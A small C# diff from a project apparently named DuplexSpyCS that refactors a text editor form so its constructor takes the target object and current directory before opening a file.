@@ -52,11 +52,9 @@ namespace DuplexSpyCS
             }
             else //FILE
             {
-                frmTextEditor f = new frmTextEditor();
-                f.v = v;
+                frmTextEditor f = new frmTextEditor(v, dir);
                 f.Tag = Function.TextEditor;
                 f.Text = $@"TextEditor\\{v.ID}";
-                f.currentDir = dir;
                 f.Show();
                 f.ShowTextFile(Path.Combine(dir, name), string.Empty);
             }
